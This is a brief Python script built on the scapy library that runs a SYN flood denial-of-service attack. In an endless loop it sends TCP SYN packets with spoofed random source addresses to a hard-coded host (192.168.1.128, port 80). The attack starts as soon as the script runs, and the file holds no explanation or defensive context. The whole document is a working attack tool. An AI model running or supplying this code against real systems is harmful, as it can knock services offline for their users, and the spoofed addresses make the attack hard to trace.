from scapy.all import *

def syn_flood(target_ip, target_port):
    print(f"Starting SYN flood on {target_ip}:{target_port}")
    while True:
        source_ip = RandIP()
        ip_layer = IP(src=str(source_ip), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

target_ip = "192.168.1.128"
target_port = 80
syn_flood(target_ip, target_port)



